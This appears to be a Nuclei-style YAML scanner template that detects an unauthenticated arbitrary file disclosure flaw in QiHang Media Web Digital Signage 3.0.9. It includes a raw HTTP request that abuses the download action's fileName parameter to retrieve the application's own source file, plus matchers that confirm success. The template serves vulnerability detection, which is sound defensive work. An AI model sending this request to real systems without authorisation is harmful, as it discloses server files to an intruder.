http:
- matchers:
  - condition: and
    part: header
    type: word
    words:
    - filename=QH.aspx
    - application/zip
  - condition: and
    type: word
    words:
    - QH.aspx.cs
    - QiHang.Media.Web.QH
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /QH.aspx?responderId=ResourceNewResponder&action=download&fileName=.%2fQH.aspx
    HTTP/1.1

    Host: {{Hostname}}

    Connection: close

    '
id: qihang-media-lfi
info:
  author: gy741
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
    cvss-score: 8.6
    cwe-id: CWE-22
  description: The QiHang Media Web application suffers from an unauthenticated file
    disclosure vulnerability when input passed thru the filename parameter when using
    the download action or thru path parameter when using the getAll action is not
    properly verified before being used. This can be exploited to disclose contents
    of files and directories from local resources.
  metadata:
    max-request: 1
  name: QiHang Media Web (QH.aspx) Digital Signage 3.0.9 - Arbitrary File Disclosure
  reference:
  - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5581.php
  severity: high
  tags: qihang,lfi,disclosure
